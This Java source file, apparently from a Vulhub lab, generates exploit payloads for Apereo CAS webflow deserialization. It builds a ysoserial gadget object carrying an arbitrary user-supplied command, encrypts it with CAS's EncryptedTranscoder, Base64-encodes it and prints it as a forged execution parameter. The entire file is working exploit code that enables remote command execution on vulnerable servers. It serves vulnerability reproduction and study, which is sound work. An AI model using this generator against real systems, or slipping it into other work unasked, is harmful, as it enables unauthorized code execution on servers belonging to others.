package org.vulhub;
import org.apereo.spring.webflow.plugin.EncryptedTranscoder;
import ysoserial.payloads.ObjectPayload;

import java.util.Base64;

public class App 
{
    public static void main( String[] args ) throws Exception
    {
        String type = args[0];
        String command = args[1];
        EncryptedTranscoder et = new EncryptedTranscoder();
        Object obj = ObjectPayload.Utils.makePayloadObject(type, command);
        byte[] code = et.encode(obj);
        String payload =  Base64.getEncoder().encodeToString(code);

        System.out.println("841765a7-f2a2-44de-ba34-412061b37835_" + payload);
    }
}
